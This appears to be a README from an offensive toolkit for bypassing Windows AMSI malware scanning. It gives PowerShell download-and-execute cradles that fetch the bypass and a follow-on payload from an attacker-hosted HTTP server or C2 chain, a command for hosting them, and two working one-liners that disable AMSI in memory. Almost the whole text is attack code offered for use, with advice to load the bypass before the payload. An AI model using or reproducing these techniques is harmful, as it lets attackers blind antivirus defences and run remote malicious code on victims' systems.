# AMSI Bypass

## Files

| File | Purpose |
|---|---|
| `amsi-bypass.ps1` | PowerShell — patches `AmsiOpenSession` in memory via `VirtualProtect` + `xor rax,rax` |
| `amsi-techniques.md` | Reference — three AMSI bypass techniques with code |

## Usage

### Option 1 — Run directly in a PowerShell session

```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://<IP>/amsi-bypass.ps1')
```

Or paste it directly into the session before running any detected script.

### Option 2 — Host and IEX from a C2 / macro chain

Serve `amsi-bypass.ps1` on your HTTP server:
```bash
python3 -m http.server 80
```

Then in your payload (`run.txt` or equivalent):
```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://<IP>/amsi-bypass.ps1')
IEX (New-Object System.Net.WebClient).DownloadString('http://<IP>/run.txt')
```

Always load the AMSI bypass **before** the payload.

### Option 3 — Quick one-liners (from amsi-techniques.md)

**Context corruption:**
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

**amsiInitFailed (2016 classic):**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
